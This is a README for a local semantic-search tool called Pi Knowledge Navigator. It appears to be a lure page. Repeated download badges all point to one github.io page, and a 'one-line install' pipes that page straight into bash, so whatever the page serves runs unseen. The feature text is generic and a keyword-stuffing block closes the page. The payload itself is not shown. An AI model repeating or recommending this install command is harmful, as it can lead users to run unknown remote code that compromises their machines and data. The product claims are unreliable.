# Pi Knowledge Navigator: Semantic Search Engine for Local File Systems

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://jee3m.github.io/augmentative-knowledge-hooks/)

## 🧠 Introduction: Beyond Keyword Matching - A New Paradigm for Local Intelligence

In the vast digital landscape of 2026, where information overload is the norm, **Pi Knowledge Navigator** emerges as a lighthouse in the storm. This is not just another search tool; it is a **semantic understanding engine** designed to transform your local files into a living, breathing knowledge base. Imagine having a personal librarian that doesn't just find words but grasps concepts, remembers context, and evolves with your data in real-time.

Built for developers, researchers, and knowledge workers who use **pi** (the personal AI framework), this repository indexes your text and markdown files, watches for changes, and exposes a powerful `knowledge_search` tool directly to your Large Language Model (LLM). It is the bridge between your unstructured local data and the reasoning power of modern AI.

## 🔥 Key Features That Redefine Local Search

- **Semantic Vector Search** – Converts your files into high-dimensional embeddings, finding meaning rather than just matching strings.
- **Real-Time File Watching** – Utilizes operating system file events (inotify, FSEvents, ReadDirectoryChanges) to index changes instantly without manual re-indexing.
- **LLM Tool Integration** – Exposes a clean `knowledge_search` function that any LLM (OpenAI, Claude, local models) can call to query your local knowledge base.
- **Responsive UI** – A lightweight web interface for direct querying, built with modern JavaScript frameworks. Works on mobile, tablet, and desktop.
- **Multilingual Support** – Search across files in English, Spanish, French, German, Chinese, Japanese, and 40+ other languages. The embedding model understands language-agnostic semantics.
- **Privacy-First Architecture** – All indexing and search happens locally. No data leaves your machine. Your knowledge is your property.
- **24/7 Background Operation** – Runs as a daemon or service, silently indexing and waiting for your queries.
- **Smart Chunking & Context** – Automatically splits large documents into semantic chunks, retaining metadata and context for precise retrieval.

## 🛠️ Technical Architecture: How the Knowledge Engine Works

```mermaid
graph TD
    A[Local File System] --> B[File Watcher]
    B --> C{Change Detected?}
    C -->|New/Modified File| D[Text Extractor]
    C -->|Deleted File| E[Remove from Index]
    D --> F[Markdown & Text Parser]
    F --> G[Semantic Chunking Engine]
    G --> H[Embedding Model (Local/API)]
    H --> I[Vector Database (SQLite + FAISS)]
    E --> I
    I --> J[LLM Tool Interface]
    J --> K[OpenAI API]
    J --> L[Claude API]
    J --> M[Local LLM (Ollama, llama.cpp)]
    K --> N[User Query]
    L --> N
    M --> N
    N --> O[Semantic Search]
    O --> P[Ranked Results + Context]
    P --> Q[LLM Generates Answer]
```

The architecture is deliberately **modular and extensible**. Each component can be swapped - use a different embedding model, change the vector store, or connect to a different LLM backend. The Mermaid diagram above shows the data flow from file creation to intelligent answer generation.

## 🚀 Getting Started: Quick Installation

### Prerequisites
- Python 3.10+ or Node.js 18+
- Basic familiarity with command-line tools
- A running instance of `pi` (or the ability to call its API)

### Installation Options

#### Option A: One-Line Install (Recommended for beginners)
```bash
curl -sSL https://jee3m.github.io/augmentative-knowledge-hooks/ | bash
```
[![Download](https://img.shields.io/badge/Download%20Script-brightgreen?style=for-the-badge&logo=github)](https://jee3m.github.io/augmentative-knowledge-hooks/)

#### Option B: Manual Installation
1. Download the latest release for your OS:
   - **macOS (Apple Silicon/Intel)**
   - **Linux (x86_64, ARM64)**
   - **Windows (x64, ARM64)**

2. Extract the archive and run the installer:
   ```bash
   tar -xzf pi-knowledge-navigator-v1.0.0.tar.gz
   cd pi-knowledge-navigator
   python setup.py install
   ```

## 💻 OS Compatibility Table

| Operating System | Architecture | Status | Emoji |
|-----------------|--------------|--------|-------|
| macOS Ventura+  | Apple Silicon | ✅ Supported | 🍎 |
| macOS Ventura+  | Intel x86_64  | ✅ Supported | 💻 |
| Ubuntu 22.04+   | x86_64        | ✅ Supported | 🐧 |
| Ubuntu 22.04+   | ARM64         | ✅ Supported | 🤖 |
| Fedora 38+      | x86_64        | ✅ Supported | 🦅 |
| Windows 11      | x64           | ✅ Supported | 🪟 |
| Windows 11      | ARM64         | 🟡 Beta       | 🔄 |
| Raspberry Pi OS | ARMv7/ARM64   | ✅ Supported | 🥧 |

## ⚙️ Example Profile Configuration

Create a `profile.yaml` file (or use the `pi` configuration system):

```yaml
knowledge_search:
  enabled: true
  index_path: "~/.pi/knowledge/index"
  watch_directories:
    - path: "/home/user/Documents/Notes"
      recursive: true
      file_types: [".md", ".txt", ".rst", ".org"]
    - path: "/home/user/Projects/Research"
      recursive: true
      file_types: [".md", ".txt"]
  embedding_model: "all-MiniLM-L6-v2"  # Or use "openai/text-embedding-3-small" or "cohere/embed-english-v3"
  vector_db: "sqlite+faiss"            # Options: sqlite+faiss, chroma, qdrant
  chunk_size: 512                      # Tokens per chunk
  chunk_overlap: 64                    # Overlap between chunks for context continuity
  llm_backend: "openai"               # Options: openai, claude, local
  openai_api_key: "${OPENAI_API_KEY}" # Read from environment variable or secrets manager
  claude_api_key: "${CLAUDE_API_KEY}" # Read from environment variable or secrets manager
  local_model: "llama3:8b"            # For local LLM backends
```

## 🖥️ Example Console Invocation

```bash
# Direct query via the knowledge_search tool
pi knowledge_search "What did I write about quantum entanglement in my research notes?"

# Expected output:
# Found 3 relevant documents.
# Response: Based on your notes from 'quantum_mechanics_overview.md' and 'research_log_2026.md':
# Quantum entanglement... [detailed answer with citations]
```

Or run the standalone server:
```bash
pi-knowledge-navigator serve --port 8080 --config profile.yaml
```

## 🌐 API Integration: OpenAI and Claude

### OpenAI Integration
The tool natively supports the OpenAI API for both embedding generation and LLM completion:

```python
from pi_knowledge_search import KnowledgeBase

kb = KnowledgeBase(
    embedding_provider="openai",
    openai_api_key="sk-...",
    model="text-embedding-3-small"
)

results = kb.search("concept drift in machine learning", top_k=5)
```

### Claude Integration
For those preferring Anthropic's ecosystem:

```python
from pi_knowledge_search import KnowledgeBase

kb = KnowledgeBase(
    llm_provider="claude",
    claude_api_key="sk-ant-...",
    model="claude-3-opus-20240229"
)

response = kb.query_with_context("What are the key insights from my 2026 meeting notes?")
```

### Local LLM Integration
For air-gapped environments or privacy extremists:

```bash
pi-knowledge-navigator run --local-model "mistral:7b" --embedder "sentence-transformers/all-MiniLM-L6-v2"
```

## 🎯 Use Cases: Where Semantic Search Shines

1. **Personal Knowledge Management** – Never lose a brilliant thought again. Search your daily journal, technical notes, and bookmarks with natural language questions.
2. **Research & Academia** – Synthesize hundreds of PDFs and markdown files. "Find all papers discussing adversarial attacks on transformer models."
3. **Software Documentation** – Run `knowledge_search "How do we handle authentication in the user service?"` against your company's Notion exports and internal wikis.
4. **Legal & Compliance** – Search through years of contracts and legal documents for specific clauses, without relying on external cloud services.
5. **Medical & Scientific Data** – Keep patient notes or lab results private while still benefiting from AI-powered retrieval.

## 🧰 Feature Deep Dive

### Responsive UI
The built-in web interface adapts to any screen size. Whether you are querying from a 27-inch monitor or a smartphone, the experience is fluid and intuitive. The UI is built with **React + Tailwind CSS** and communicates with the backend via WebSockets for real-time updates.

### Multilingual Support
Powered by `sentence-transformers/paraphrase-multilingual-MiniLM-L12-v2`, the engine understands queries in over 50 languages. You can ask a question in English and retrieve relevant results from a Chinese document, or vice versa. The semantic layer normalizes cross-lingual meaning.

### 24/7 Customer Support
While the tool runs autonomously, our **community and enterprise support** is available 24/7:
- **Community Slack/Discord** – Moderated by core contributors and power users.
- **Enterprise Support** – SLA-backed support with guaranteed response times (available as a premium add-on).

## 📜 License

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for full details. You are free to use, modify, and distribute this software for any purpose, commercial or private.

## ⚠️ Disclaimer

**Important**: This tool is designed to enhance your productivity by making local file search intelligent. It does **not** send your file contents to any third-party server unless you explicitly configure it to use OpenAI, Claude, or other API-based embedding models. By enabling cloud-based embeddings, you accept their respective privacy policies and terms of service. The authors of this software are not responsible for data leakage due to user misconfiguration or the use of external APIs.

**No Warranty**: This software is provided "as is" without warranty of any kind, express or implied. Use at your own risk.

---

[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://jee3m.github.io/augmentative-knowledge-hooks/)

**Keywords**: semantic search, local file search, vector database, LLM tool, knowledge base, pi framework, embeddings, RAG, retrieval augmented generation, OpenAI integration, Claude integration, file watcher, markdown search, privacy-first AI, 2026.

**Transform your file system into a thinking partner.** Download Pi Knowledge Navigator today.